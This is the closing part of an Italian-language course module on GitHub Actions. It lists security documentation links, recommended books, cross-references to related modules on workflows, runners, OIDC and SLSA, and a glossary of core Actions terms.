- **Security Hardening for Actions**: https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions — Best practice di sicurezza per workflow.
- **OIDC for Cloud Providers**: https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect — Autenticazione cloud senza credenziali statiche.

### Libri consigliati

- **"Learning GitHub Actions" — Brent Laster** (O'Reilly) — Guida completa dalle basi ai pattern avanzati di GitHub Actions.
- **"Automating Workflows with GitHub Actions" — Priscila Heller** (Packt) — Focus pratico su automazione CI/CD con Actions.
- **"Continuous Delivery" — Jez Humble, David Farley** (Addison-Wesley) — Fondamento teorico per pipeline CI/CD, applicabile a GitHub Actions.

---

## Riferimenti Incrociati

| Modulo | File | Relazione |
|--------|------|-----------|
| 17 | [17-github-actions-workflow-sintassi.md](17-github-actions-workflow-sintassi.md) | Approfondimento sulla sintassi YAML: trigger, espressioni e contesti |
| 18 | [18-github-actions-avanzate.md](18-github-actions-avanzate.md) | Composite actions, reusable workflow, custom runners e ottimizzazione |
| 19 | [19-github-actions-ci-cd-ricette.md](19-github-actions-ci-cd-ricette.md) | Ricette pronte per CI/CD: test, build, deploy, release automation |
| 21 | [21-github-actions-self-hosted-runners.md](21-github-actions-self-hosted-runners.md) | Configurazione e gestione di self-hosted runner e ARC |
| 26 | [26-oidc-cloud-credentials.md](26-oidc-cloud-credentials.md) | OIDC per autenticazione cloud senza secrets statiche |
| 27 | [27-supply-chain-attestation-slsa.md](27-supply-chain-attestation-slsa.md) | Attestation SLSA e supply chain security nei workflow |

---

## Glossario

| Termine | Definizione |
|---------|-------------|
| **Workflow** | File YAML in `.github/workflows/` che definisce una pipeline di automazione con trigger, job e step |
| **Job** | Unità di esecuzione all'interno di un workflow, eseguita su un runner; i job possono essere paralleli o sequenziali |
| **Step** | Singola azione all'interno di un job: può essere un comando shell (`run`) o un'action (`uses`) |
| **Action** | Unità riutilizzabile di automazione (JavaScript, Docker o composite) pubblicabile sul Marketplace |
| **Runner** | Macchina (hosted o self-hosted) che esegue i job di un workflow |
| **Matrix Build** | Strategia che esegue lo stesso job su combinazioni multiple di parametri (OS, versione linguaggio, etc.) |
| **GITHUB_TOKEN** | Token automatico con permessi configurabili via blocco `permissions`, scade al termine del workflow |
| **Secret** | Valore criptato memorizzato a livello repository, environment o organization, non visibile nei log |
| **Artifact** | File o directory prodotti da un job e condivisibili tra job o scaricabili dopo l'esecuzione |
| **Cache** | Storage persistente tra esecuzioni per accelerare l'installazione di dipendenze (chiave basata su hashFiles) |
| **Composite Action** | Action che combina più step in un'unica unità riutilizzabile definita in `action.yml` |
| **Reusable Workflow** | Workflow invocabile da altri workflow con `workflow_call`, per standardizzazione a livello org |
| **Concurrency** | Meccanismo per raggruppare esecuzioni e cancellare quelle obsolete (`cancel-in-progress`) |
| **Environment** | Configurazione target di deploy con secrets dedicati, required reviewers e wait timer |
| **workflow_dispatch** | Trigger manuale che permette di avviare un workflow dalla UI o API con input personalizzati |
